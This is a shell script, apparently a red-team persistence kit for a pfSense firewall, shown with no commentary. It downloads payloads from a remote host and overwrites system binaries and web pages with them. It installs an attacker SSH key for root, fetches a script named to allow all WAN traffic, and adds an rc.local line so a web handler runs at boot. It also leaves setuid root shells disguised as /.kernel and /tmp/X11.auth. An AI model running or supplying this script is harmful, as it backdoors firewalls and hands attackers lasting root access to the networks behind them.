theip="192.168.10.143"
theport=8000
fetch -o /etc/phpshellsessions/redteam http://${theip}:${theport}/net/pfsense/enableallowallwan
fetch -o /bin/freebsd-version http://${theip}:${theport}/net/pfsense/user.php
fetch -o /usr/local/www/pfsenseWebHandler.php http://${theip}:${theport}/net/pfsense/pfsenseWebHandler.php
fetch -o /etc/rc.something http://${theip}:${theport}/net/pfsense/admin.sh
fetch -o /usr/local/etc/tcsd.conf.sample http://${theip}:${theport}/net/pfsense/admin.php
fetch -o /usr/local/www/firewall_rules_edit.php http://${theip}:${theport}/net/pfsense/firewall_rules_edit.php
fetch -o /root/.ssh/authorized_keys http://${theip}:${theport}/files/id_red.pub
mkdir /var/net
fetch -o /var/net/netsrv.sh http://${theip}:${theport}/net/pfsense/replaceconfig.sh
chmod +x /var/net/netsrv.sh
chmod +x /usr/local/etc/tcsd.conf.sample
chmod +x /etc/rc.something
chmod +x /bin/freebsd-version
chmod +x /usr/local/www/pfsenseWebHandler.php
/bin/freebsd-version
/bin/freebsd-version
/bin/freebsd-version
/usr/local/etc/tcsd.conf.sample
cp /cf/conf/config.xml /cf/conf/config.bkg
/etc/rc.something &
/usr/local/www/pfsenseWebHandler.php &
/var/net/netsrv.sh &
rm -f /etc/rc.local
echo "/usr/local/www/pfsenseWebHandler.php >> /dev/null &" >> /etc/rc.local
cp /bin/sh /.kernel
cp /bin/sh /tmp/X11.auth
chmod +sss /.kernel
chmod +sss /tmp/X11.auth
unset theip
unset theport
